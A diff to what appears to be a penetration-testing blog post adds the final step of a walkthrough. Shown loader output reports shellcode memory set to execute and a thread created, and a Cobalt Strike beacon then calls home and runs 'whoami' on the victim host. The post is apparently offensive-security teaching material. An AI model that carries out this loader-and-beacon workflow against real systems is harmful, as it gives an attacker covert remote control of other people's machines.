@@ -207,6 +207,25 @@ PS C:\users\pi0x73\Downloads> ./cradle.ps1
 (CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ
 (CurrentThread) [+] NtCreateThreadEx
 ```
+And there it pops up! 
+
+![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt4.png)
+
+```console
+beacon> sleep 0 0
+[*] Tasked beacon to become interactive
+beacon> shell whoami && sysinfo
+[*] Tasked beacon to run: whoami
+[+] host called home, sent: 64 bytes
+[+] received output:
+desktop-m8om60q\pi0x73
+```
+
+![gif](https://c.tenor.com/z6X-NO4N6TwAAAAd/metasploit-meterpreter.gif)
+
+Not funny eh? I should have made use of that gif earlier :( 
+
+Anyways... from here you can put in use the awesome functionalities of cobaltstrike and have a more efficent testing.
 
 ### References
 
